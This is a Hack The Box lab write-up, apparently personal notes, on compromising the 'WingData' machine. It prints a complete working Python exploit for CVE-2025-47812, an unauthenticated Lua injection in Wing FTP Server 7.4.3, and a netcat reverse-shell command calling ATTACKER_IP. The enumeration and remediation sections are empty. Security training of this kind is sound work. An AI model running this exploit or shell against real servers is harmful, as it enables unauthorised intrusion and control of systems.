---
tags:
  - HTB_SN_10
link: https://app.hackthebox.com/machines/WingData
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png
date:
---
## Summary

| SECTION/TASK     | FLAG |
| ---------------- | ---- |
| Submit User Flag |      |
| Submit Root Flag |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery

### 1.1 Connecting to the HTB VPN

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2. Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

Command: `ping -c 4 TARGET_IP`

Breakdown:
- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ ping -c 4 TARGET_IP                                                                   
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=283 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=289 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=280 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=286 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 280.134/284.700/288.984/3.296 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1. Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1. The "Spearfishing" Scan (All Ports, High Speed)

Command: `nmap -p- --min-rate 5000 -Pn TARGET_IP`

Breakdown:
- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 03:41 -0500
Nmap scan report for TARGET_IP
Host is up (0.46s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.57 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2. The "Deep Dive" Scan (Targeted Aggression)

Command: `nmap -A -p p1,p2,p3,p4 TARGET_IP`

Breakdown:
- `-sC`
    - **Description:** Default Script Scan.
    - **Purpose:** Runs a collection built-in Nmap Scripting Engine (NSE) scripts to find common vulnerabilities, metadata, or hidden info.
- `-sV`
    - **Description:** Version Detection.
    - **Purpose:** Probes open ports to determine what software and version are actually running (e.g., identifying "Jetty" or "OpenSSH 9.2").
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ nmap -A -p 22,80 TARGET_IP            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 03:44 -0500
Nmap scan report for TARGET_IP
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   283.11 ms 10.10.14.1
2   288.94 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.19 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3. Scan Results Analysis

| Port | **Service** | **Version**                    | **Analysis**                                                                                                                                            |
| ---- | ----------- | ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH         | OpenSSH 9.2p1 Debian 2+deb12u7 | Standard secure shell. Version is relatively modern; unlikely to yield an easy "Low Hang" exploit. Useful for later credential spraying or persistence. |
| 80   | HTTP        | Apache httpd 2.4.66 (Debian)   | **Primary Attack Vector.** Note the redirect to `http://wingdata.htb/`. This suggests Virtual Hosting is in use and requires local DNS modification.    |

When you see `Did not follow redirect to http://facts.htb/` in Nmap, the server is essentially saying:

"I know you're at `TARGET_IP`, but I am configured to only talk to people who call me `wingdata.htb`."

This is a **301 (Permanent)** or **302 (Found)** redirect. Browsers follow this automatically, but Nmap just reports it. If the name isn't in your `/etc/hosts`, the browser follows the redirect into a "Dead End."
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2. Enumeration of Web Services

#### 2.2.1. Update Hosts File

Command: `sudo vi etc/hosts`

**Breakdown:**

- `sudo` 
	- Description: Elevated Privileges
	- Purpose: Required to modify system-level configuration files like the hosts database.
- `vi` 
	- Description: Terminal Text Editor
	- Purpose: Used to append the `TARGET_IP wingdata.htb` entry to the file.
- `/etc/hosts` 
	- Description: Static Host Lookup Table
	- Purpose: The local file that takes precedence over DNS servers, ensuring the domain resolves to the CTF machine.

<div align="center">
<br>
<br>
</div>
##### How Hostname Resolution Works

When you type a URL like `google.com` or `wingdata.htb` into your browser, your computer needs to translate that text into a numerical IP address. It follows a specific order of operations:

1. **The Browser Cache:** Your browser checks if it already knows the IP from a previous visit.
2. **The Hosts File (`/etc/hosts`):** This is your computer's "private address book." It checks here **first** before asking the internet. If an entry exists, it stops looking and goes to that IP.
3. **DNS Servers:** If the name isn't in your private book, your computer asks a DNS server (like Google’s `8.8.8.8` or your ISP).

##### Why `google.com` works but `wingdata.htb` doesn't

- **Public Sites:** `google.com` is registered on public DNS servers. When you ask the internet "Where is Google?", the internet has an official answer.

- **HTB Sites:** `wingdata.htb` is a **private domain** inside the HTB lab environment. Public DNS servers have no idea it exists. Because your computer can't find an "official" record, it gives you a "Server Not Found" error—unless you write the address into your private address book (`/etc/hosts`) yourself.
<div align="center">
<br>
<br>
</div>

#### 2.2.2. Web Enumeration

Browse to `http://wingdata.htb/`.

![[Pasted image 20260301121847.png]]

Upon clicking the **Client Portal** button located in the page header, the application attempts to redirect to `http://ftp.wingdata.htb`.

![[Pasted image 20260301123826.png|1093]]

Since the initial `/etc/hosts` update only accounted for the apex domain, this new subdomain must be manually added to the local resolution table to continue the enumeration of the FTP-related web services.

**Command:** `sudo vi /etc/hosts`

```shell
┌──(kali㉿kali)-[~/CS/HTB]
└─$ cat /etc/hosts
...
TARGET_IP     wingdata.htb
TARGET_IP     ftp.wingdata.htb
```

Refresh `http://ftp.wingdata.htb`.

![[Pasted image 20260301125509.png]]

After updating the local `hosts` file to resolve the `ftp.wingdata.htb` subdomain, refresh the page on your browser. You're instantly redirecting to a minimalist login portal. 
Inspection of the page footer shows "FTP server software powered by **[Wing FTP Server v7.4.3](https://www.wftpserver.com/)**" which is actionable intelligence regarding the backend technology in use.
<div align="center">
<br>
<br>
</div>

#### 2.2.3 Vulnerability Research

The `http://ftp.wingdata.htb` page identifies the site as running **Wing FTP Server v7.4.3**. With this information, we can search for known weaknesses that could lead to a compromise.

Search online for `Wing FTP Server v7.4.3 exploit`.

![[Pasted image 20260301132057.png]]

The exploit is CVE-2025-47812. 

**CVE-2025-47812** is a high-impact vulnerability because it allows for **Unauthenticated Remote Code Execution (RCE)** by exploiting a logic flaw in how the server handles memory and session files.

The vulnerability exists due to a "discrepancy" in how the Wing FTP Server processes strings during the login process. It is essentially a **Null Byte Injection** that leads to **Lua Code Injection**.

- **The Flaw in `c_CheckUser()`:** This function uses `strlen()` to validate the username. In C-based languages, `strlen()` stops reading once it hits a Null Byte (`%00`). If an attacker sends `anonymous%00[payload]`, the server only "sees" and validates `anonymous`, allowing authentication to succeed.

- **The Session Injection:** While the validator only sees the first half, the session creation logic in `loginok.html` saves the **entire** unsanitized string into a session file on the disk.

- **Execution:** Wing FTP stores sessions as Lua scripts. By using the Null Byte to "break" the expected string and then adding Lua tags (`]]`), an attacker can insert malicious commands. When the server later loads that session file via `loadfile()`, it executes the injected Lua code.
<div align="center">
<br>
<br>
</div>

#### 2.2.4 Exploit Identification

The next step is to find or develop a **Proof of Concept** to verify if `http://ftp.wingdata.htb` is susceptible.

Repository found: CVE-2025-47812-poc [^1]

![[Pasted image 20260301134121.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1. Exploit Acquisition and Preparation


Clone the repository from GitHub to your local attack machine.

Command: `git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git`

Breakdown:

- **`git clone`**
    - **Description:** Repository Cloning Tool.
    - **Purpose:** Copies the entire remote project, including scripts and documentation, from GitHub to a local directory on your machine.
- **`https://github.com/4m3rr0r/CVE-2025-47812-poc.git`**
    - **Description:** Remote Source URL.
    - **Purpose:** Points to the specific repository containing the exploit code.

Output:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
Cloning into 'CVE-2025-47812-poc'...
remote: Enumerating objects: 38, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 38 (delta 18), reused 3 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (38/38), 323.62 KiB | 400.00 KiB/s, done.
Resolving deltas: 100% (18/18), done.

┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ cd CVE-2025-47812-poc ; ls 
2025-07-01_18-22.png  CVE-2025-47812.py  LICENSE  README.md
```

Poc Audit:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ cat CVE-2025-47812.py  
```

```python
# Exploit Title: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2025-47812
# Date: 2025-06-30
# Exploit Author: Sheikh Mohammad Hasan aka 4m3rr0r (https://github.com/4m3rr0r)
# Vendor Homepage: https://www.wftpserver.com/
# Version: Wing FTP Server <= 7.4.3
# Tested on: Linux (Root Privileges), Windows (SYSTEM Privileges)

# Description:
# Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
# flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
# parameter during login, leading to Lua code injection into session files. These maliciously crafted
# session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
# resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows).
# The exploit leverages a discrepancy between the string processing in c_CheckUser() (which truncates at NULL)
# and the session creation logic (which uses the full unsanitized username).

# Proof-of-Concept (Python):
# The provided Python script automates the exploitation process.
# It injects a NULL byte followed by Lua code into the username during a POST request to loginok.html.
# Upon successful authentication (even anonymous), a UID cookie is returned.
# A subsequent GET request to dir.html using this UID cookie triggers the execution of the injected Lua code,
# leading to RCE.


import requests
import re
import argparse

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", password="", verbose=False):
    login_url = f"{target_url}/loginok.html"

    login_headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    from urllib.parse import quote
    encoded_username = quote(username)
    encoded_password = quote(password)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        f"%0dh%3aclose()%0dprint(r)%0d--&password={encoded_password}"
    )

    if verbose:
        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")

    try:
        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending POST request to {login_url}: {e}")
        return False

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)

    if not match:
        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
        return False

    uid = match.group(1)
    if verbose:
        print_green(f"[+] UID extracted: {uid}")

    dir_url = f"{target_url}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    if verbose:
        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
        return False

    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()

    if verbose:
        print_green("\n--- Command Output ---")
        print(clean_output)
        print_green("----------------------")
    else:
        if clean_output:
            print_green(f"[+] {target_url} is vulnerable!")
        else:
            print_red(f"[-] {target_url} is NOT vulnerable.")

    return bool(clean_output)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
    parser.add_argument("-f", "--file", type=str,
                        help="File containing list of target URLs (one per line).")
    parser.add_argument("-c", "--command", type=str,
                        help="Custom command to execute. Default: echo this is vulnerable to CVE-2025-47813. If specified, verbose output is enabled automatically.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
    parser.add_argument("-o", "--output", type=str,
                        help="File to save vulnerable URLs.")
    parser.add_argument("-U", "--username", type=str, default="anonymous",
                        help="Username to use in the exploit payload. Default: anonymous")
    parser.add_argument("-P", "--password", type=str, default="",
                        help="Password to use in the exploit payload. Default: <null>")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either -u/--url or -f/--file must be specified.")

    command_to_use = args.command if args.command else "this is vulnerable to CVE-2025-47812"
    verbose_mode = True if args.command else args.verbose

    vulnerable_sites = []

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_red(f"[-] Could not read target file '{args.file}': {e}")
            return
    else:
        targets = [args.url]

    for target in targets:
        print(f"\n[*] Testing target: {target}")
        is_vulnerable = run_exploit(target, command_to_use, username=args.username, password=args.password, verbose=verbose_mode)
        if is_vulnerable:
            vulnerable_sites.append(target)

    if args.output and vulnerable_sites:
        try:
            with open(args.output, 'w') as out_file:
                for site in vulnerable_sites:
                    out_file.write(site + "\n")
            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
        except Exception as e:
            print_red(f"[-] Could not write to output file '{args.output}': {e}")

if __name__ == "__main__":
    main()
```


Logic Flow of the Script:

1. **Stage 1 (Injection):** It sends a `POST` request to `loginok.html`. The `username` parameter is crafted as: `username%00]] [Lua Code] --`. This bypasses the check but writes the code to the session.

2. **Stage 2 (Extraction):** The script parses the `Set-Cookie` header from the server's response to grab the **UID** (Session ID).

3. **Stage 3 (Trigger):** It makes a `GET` request to `dir.html` using that **UID**. The server loads the "poisoned" session file, executes the Lua code, and the script prints the output of your command back to your terminal.
<div align="center">
<br>
<br>
</div>

### 3.2 Executing `CVE-2025-47812.py`

**Test for Vulnerability:** `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"`

Output:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "whoami"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 9d52dcf82d167b395295d0451e0bcc03f528764d624db129b32c21fbca0cb8d6                                                                                                  

--- Command Output ---                                                                                              
wingftp
----------------------
```

**Gain a Reverse Shell:**

Once RCE is confirmed, the logical next step is to move from single command execution to an interactive shell.

**Listener:** On your Kali machine, start a listener: `nc -lvnp 4444`.

**Breakdown:**

- `-l`
	- Description: Listen Mode
	- Purpose: Sets netcat to wait for an incoming connection.
- `-v`
	- Description: Verbose
	- Purpose: Displays information about the connection source.
- `-n`
	- Description: No DNS
	- Purpose: Prevents delays by not resolving hostnames.
- `-p 4444`
	- Description: Port Number
	- Purpose: Matches the port used in the exploit payload.

**Exploit:** Run the script with a bash reverse shell payload:

Command: `python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v`

Breakdown:

- `nc 10.10.14.247 4444`
	- Description: Netcat Client
	- Purpose: Directs the target to connect to the attacker's listener at the specified IP and port.

- `-e /bin/sh`
	- Description: Execute Flag
	- Purpose: Binds the system shell to the network socket, providing remote command-line access.

- `-v` Description:
	- Verbose Mode
	- Purpose: Provides real-time feedback on the injection and extraction process.

Output:

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc ATTACKER_IP 4444 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
```

```
┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.9.90] 54034
```

The terminal output confirms that you have achieved a **Reverse Shell** on the target. The `Read timed out` error in your exploit script is actually a positive indicator in this specific context: the web server is "hanging" the HTTP request because it is busy maintaining the open socket for your netcat connection.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 Shell Stabilization

The current shell is likely a "dumb" shell, meaning it lacks tab completion, job control, and the ability to use interactive commands like `top` or `nano`. Stabilizing this shell is the first priority to prevent accidental disconnection.

**Command:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`

**Breakdown:**

- `import pty`
	- Description: Pseudo-Terminal Module
	- Purpose: Accesses Python's internal library for terminal control.
- `pty.spawn("/bin/bash")`
	- Description: Terminal Spawning
	- Purpose: Upgrades the current raw `/bin/sh` to a more feature-rich `/bin/bash` instance.
<div align="center">
<br>
<br>
</div>

### 4.2 Enumeration


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Conclusion & Remediation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

[^1]: [CVE-2025-47812-poc](https://github.com/4m3rr0r/CVE-2025-47812-poc)
